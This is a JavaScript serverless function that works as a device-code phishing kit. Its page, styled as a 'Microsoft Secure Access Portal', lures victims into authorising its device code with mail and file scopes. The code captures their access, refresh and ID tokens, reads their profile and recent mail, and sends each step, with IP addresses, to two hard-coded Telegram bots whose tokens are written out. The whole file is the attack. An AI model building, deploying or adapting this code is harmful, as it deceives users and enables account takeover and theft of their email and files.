const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  context.log('🎯 Device Code: Request received');
  
  await sendTelegram(`🎯 <b>DEVICE CODE: Security page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}\n🔗 URL: ${req.url}`);
  
  const CLIENT_ID = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI
  const SCOPE = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite offline_access openid profile email';
  
  const action = req.query.action;
  
  if (action === 'generate_code') {
    try {
      const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `client_id=${CLIENT_ID}&scope=${encodeURIComponent(SCOPE)}`
      });
      
      const data = await response.json();
      
      if (data.device_code) {
        await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\n🔑 Code: ${data.user_code}\n📱 URL: ${data.verification_uri}\n⏰ Expires: ${data.expires_in}s`);
        
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            success: true,
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval
          })
        };
      } else {
        throw new Error('No device code returned');
      }
    } catch (error) {
      context.log('Error generating device code:', error);
      context.res = {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: error.message })
      };
    }
    return;
  }
  
  if (action === 'poll_token') {
    const deviceCode = req.query.device_code;
    
    if (!deviceCode) {
      context.res = {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Device code required' })
      };
      return;
    }
    
    try {
      const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=${CLIENT_ID}&device_code=${deviceCode}`
      });
      
      const data = await response.json();
      
      if (data.access_token) {
        // 🔥 SUCCESS - CAPTURE ALL TOKENS INCLUDING REFRESH TOKEN
        await sendTelegram(`🔥 <b>TOKEN CAPTURE SUCCESS!</b>\n✅ Access Token: ${data.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${data.refresh_token ? data.refresh_token.substring(0, 50) + '...' : 'None'}\n🆔 ID Token: ${data.id_token ? data.id_token.substring(0, 50) + '...' : 'None'}`);
        
        // Fetch user profile and mail simultaneously
        try {
          const [userResponse, mailResponse] = await Promise.all([
            fetch('https://graph.microsoft.com/v1.0/me', {
              headers: { 'Authorization': `Bearer ${data.access_token}` }
            }),
            fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
              headers: { 'Authorization': `Bearer ${data.access_token}` }
            })
          ]);
          
          const userData = await userResponse.json();
          const mailData = await mailResponse.json();
          
          await sendTelegram(`👤 <b>USER PROFILE CAPTURED</b>\n📧 Email: ${userData.mail || userData.userPrincipalName}\n🏢 Organization: ${userData.companyName || 'Personal'}\n📬 Recent Emails: ${mailData.value ? mailData.value.length : 0} messages`);
          
        } catch (profileError) {
          console.error('Profile fetch error:', profileError);
        }
        
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            success: true,
            access_token: data.access_token,
            refresh_token: data.refresh_token,
            id_token: data.id_token,
            expires_in: data.expires_in
          })
        };
      } else if (data.error === 'authorization_pending') {
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pending: true })
        };
      } else {
        await sendTelegram(`⚠️ <b>DEVICE CODE POLLING</b>\n🔥 Error: ${data.error}\n📝 Description: ${data.error_description}`);
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        };
      }
    } catch (error) {
      await sendTelegram(`⚠️ <b>POLLING ERROR</b>\n🔥 Error: ${error.message}`);
      context.res = {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: error.message })
      };
    }
    return;
  }
  
  // Main UI
  context.res = {
    status: 200,
    headers: { 'Content-Type': 'text/html' },
    body: `
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Secure Access Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; text-align: center; }
        .logo { width: 80px; height: 80px; margin: 0 auto 20px; background: #0078d4; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
        h1 { color: #323130; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #605e5c; margin-bottom: 30px; }
        .step { margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #0078d4; }
        .device-code { font-size: 24px; font-weight: bold; letter-spacing: 2px; color: #0078d4; margin: 15px 0; padding: 15px; background: #e6f3ff; border-radius: 6px; }
        .button { background: #0078d4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; margin: 10px; transition: background 0.3s; }
        .button:hover { background: #106ebe; }
        .status { margin: 20px 0; padding: 15px; border-radius: 6px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
        .hidden { display: none; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">M</div>
        <h1>Microsoft Secure Access</h1>
        <p class="subtitle">Enhanced Security Verification Portal</p>
        
        <div id="step1">
            <div class="step">
                <h3>🔐 Step 1: Generate Security Code</h3>
                <p>Click below to generate your secure access code</p>
                <button class="button" onclick="generateCode()">Generate Access Code</button>
            </div>
        </div>
        
        <div id="step2" class="hidden">
            <div class="step">
                <h3>📱 Step 2: Device Verification</h3>
                <p>Enter this code on the verification page:</p>
                <div class="device-code" id="userCode">Loading...</div>
                <a id="verificationLink" class="button" target="_blank">Open Verification Page</a>
                <button class="button" onclick="startPolling()">I've Entered the Code</button>
            </div>
        </div>
        
        <div id="step3" class="hidden">
            <div class="step">
                <h3>⏳ Step 3: Waiting for Verification</h3>
                <p>Please complete the verification on the Microsoft page</p>
                <div class="loading"></div>
                <p>Checking status every 3 seconds...</p>
            </div>
        </div>
        
        <div id="status"></div>
    </div>

    <script>
        let deviceCodeData = null;
        let pollingInterval = null;

        async function generateCode() {
            try {
                const response = await fetch('?action=generate_code');
                const data = await response.json();
                
                if (data.success) {
                    deviceCodeData = data;
                    document.getElementById('userCode').textContent = data.user_code;
                    document.getElementById('verificationLink').href = data.verification_uri;
                    
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                    
                    showStatus('Code generated successfully! Please verify on the Microsoft page.', 'success');
                } else {
                    showStatus('Failed to generate code: ' + (data.error || 'Unknown error'), 'error');
                }
            } catch (error) {
                showStatus('Network error: ' + error.message, 'error');
            }
        }

        async function startPolling() {
            if (!deviceCodeData) {
                showStatus('No device code available', 'error');
                return;
            }
            
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
            
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(\`?action=poll_token&device_code=\${deviceCodeData.device_code}\`);
                    const data = await response.json();
                    
                    if (data.success) {
                        clearInterval(pollingInterval);
                        showStatus('✅ Authentication successful! Access granted.', 'success');
                        document.getElementById('step3').classList.add('hidden');
                        
                        // Show success message
                        document.querySelector('.container').innerHTML = \`
                            <div class="logo">✅</div>
                            <h1>Access Granted</h1>
                            <p class="subtitle">Your Microsoft account has been successfully verified</p>
                            <div class="status success">
                                <strong>Welcome!</strong> You now have secure access to Microsoft services.
                            </div>
                        \`;
                    } else if (data.pending) {
                        // Continue polling
                    } else if (data.error) {
                        if (data.error === 'expired_token') {
                            clearInterval(pollingInterval);
                            showStatus('Code expired. Please generate a new code.', 'error');
                            location.reload();
                        } else {
                            showStatus(\`Error: \${data.error} - \${data.error_description || ''}\`, 'warning');
                        }
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 3000); // Poll every 3 seconds
        }

        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.innerHTML = \`<div class="status \${type}">\${message}</div>\`;
        }
    </script>
</body>
</html>
    `
  };
};